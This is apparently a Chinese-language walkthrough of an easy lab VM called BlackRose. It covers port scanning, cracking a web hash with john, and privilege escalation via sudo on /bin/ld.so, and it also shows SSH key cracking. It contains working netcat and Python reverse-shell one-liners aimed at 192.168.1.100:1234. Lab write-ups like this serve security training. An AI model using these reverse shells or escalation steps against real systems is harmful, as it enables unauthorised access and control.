> vmware打开改网卡名在netplan中，bash有问题 shift+/为 : , 按下''输入字母i，shift+小键盘7 输入 / , / 输入 .

## 靶机信息
- 级别:容易
- 固定IP:192.168.1.21

## Recon
### nmap
```shell
//IP:192.168.1.21

sudo nmap -sT -p- --min-rate 10000 192.168.1.21

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

## Web
![[Pasted image 20231016095110.png]]

![[Pasted image 20231016095714.png]]
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash //解出来是whoami，其实左边也有提示
```
![[Pasted image 20231016095819.png]]
```shell
//如果一段时间不输入命令会timeout，刷新一下再输入命令即可
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 1234 >/tmp/f
$2a$10$ktFRNUiptqhLPzdzOkGWce.KZqE5LV29499FmQoFAhdy7T/JDkjgS


$2a$10$KYsaFtbcW6E6S.sfK1PPoufflUc9XB.svS8YkJSi7dWxsGhiQ4IA6

export RHOST="192.168.1.100";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'

https://www.browserling.com/tools/bcrypt

```
![[Pasted image 20231016103339.png]]
修改value
signature和加密后的command要一致才能执行命令

## 提权

```shell
www-data@BlackRose:/home/delx$ sudo -l
User www-data may run the following commands on BlackRose:
    (delx : delx) NOPASSWD: /bin/ld.so


www-data@BlackRose:/home/delx$ sudo -u delx /bin/ld.so /bin/bash

delx目录中看到了ssh私钥，复制到kali中
ssh2john id_rsa_hash > rsa_hash
john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash
doggiedog        (id_rsa_hash) 
```

```shell
find / -type f -user delx 2>/dev/null //查找所有属于delx的文件
strings /usr/local/.../showPassword
```
![[Pasted image 20231016105354.png]]
![[Pasted image 20231016105622.png]]





